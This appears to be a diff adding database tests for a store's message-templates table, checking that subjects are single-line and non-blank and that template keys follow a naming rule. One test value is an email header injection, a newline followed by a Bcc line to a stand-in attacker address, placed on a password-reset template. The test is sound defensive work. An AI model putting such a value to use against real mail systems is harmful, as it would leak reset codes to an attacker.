@@ -1486,6 +1486,35 @@ begin
 end $$;
 
 -- ============================================================
+-- Message templates (0021)
+--
+-- Customer-facing copy is staff-editable, which makes it the one place
+-- an ordinary admin action can reach every inbox the store writes to.
+-- The subject is a single header line, and the database is what says so
+-- -- not the API, and not whichever mail adapter happens to be selected.
+-- ============================================================
+
+select must_fail($$
+  insert into message_templates (key, subject, body)
+  values ('password_reset', E'Reset\nBcc: attacker@evil.com', 'code {{code}}')
+$$, 'template subject is one line -- a newline is a header injection into every send');
+
+select must_fail($$
+  insert into message_templates (key, subject, body)
+  values ('password_reset', '   ', 'code {{code}}')
+$$, 'template subject cannot be blank -- an empty subject is an outage, not a style');
+
+select must_fail($$
+  insert into message_templates (key, subject, body)
+  values ('Password Reset', 'ok', 'code {{code}}')
+$$, 'template key must match message_log.template -- lowercase and underscores only');
+
+select must_pass($$
+  insert into message_templates (key, subject, body)
+  values ('password_reset', 'Your code', 'Use {{code}} to continue')
+$$, 'message_templates -- a well-formed override is accepted');
+
+-- ============================================================
 -- RLS: a customer must not be able to write privileged state
 -- ============================================================
 
